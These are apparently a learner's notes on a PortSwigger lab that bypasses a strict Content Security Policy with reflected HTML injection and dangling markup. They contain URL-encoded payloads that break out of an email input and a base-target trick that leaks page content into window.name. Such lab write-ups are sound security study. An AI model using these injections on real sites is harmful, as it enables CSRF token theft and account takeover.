# [Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)

> log in -> `wiener:peter`

- if you add `&email=duck` as a parameter it will reflect on the site:

```
https://xxx.web-security-academy.net/my-account?id=wiener&email=duck
```

> on ispection the input have a hidden csrf input shipped with:

```
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
  <label>Email</label>
  <input required="" type="email" name="email" value="duck" />
  <input required="" type="hidden" name="csrf" value="G2S3HEyrGsnfXT2CFKkr4yH8rqwOakRi" />
  <button class="button" type="submit">Update email</button>
</form>
```

> lets try to break out form the `value` of the `input` tag

`"><img src="nothing`

- needs to be url encoded ->

`%22%3E%3Cimg%20src=%22nothing%0A%0A`

```
https://xxx.web-security-academy.net/my-account?id=wiener&email=%22%3E%3Cimg%20src=%22nothing%0A%0A
```

- can break out for the value, but the CSP blocks the image, checking the response on the network tab:

```
Content-Security-Policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';
```

> lets change it to anchor tag

`"><a href="https://www.google.com">Click me</a`

- url encoded ->

`%22%3E%3Ca%20href=%22https://www.google.com%22%3EClick%20me%3C/a`

- it works

## the dangling effect

try using the `base` tag with the `target` attribute

`https://xxx.web-security-academy.net/my-account?id=wiener&email="><a href="https://www.metallica.com">Click me</a><base target="duck"`

- does not work on google, that is why metallica

- url encoded ->

```
https://xxx.web-security-academy.net/my-account?id=wiener&email=%22%3E%3Ca%20href=%22https://www.metallica.com%22%3EClick%20me%3C/a%3E%3Cbase%20target=%22duck%22
```

- on clicking the link it will open the metallica.com and in the devtools type `window.name` -> "duck"
